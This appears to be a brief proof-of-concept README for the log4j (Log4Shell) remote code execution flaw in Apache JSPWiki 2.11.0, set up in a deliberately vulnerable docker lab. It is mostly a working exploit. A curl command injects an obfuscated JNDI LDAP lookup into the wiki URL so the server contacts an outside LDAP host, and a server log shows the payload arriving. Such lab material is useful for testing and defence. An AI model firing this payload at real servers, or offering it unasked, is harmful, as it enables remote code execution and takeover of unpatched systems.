# Apache JSPWiki log4j RCE

## vulnerable app

```
docker pull vultarget/jspwiki_log4j_rce:2.11.0

docker run -d -p 8080:8080 --name jspwiki vultarget/jspwiki_log4j_rce:2.11.0
```

## Poc

```
curl -vv http://xxxxxxxx:8080/wiki/$%7Bjndi:ldap:$%7B::-/%7D/jspwiki_test.yyyyyyy%7D/
```

Log

```
[INFO ] 2021-12-14 11:21:15.519 [http-nio-8080-exec-3] o.a.w.WikiServlet - Request for page: ${jndi:ldap:${::-/}/10.0.0.6:1270/abc}/
```

I've tested it

![](1.png)
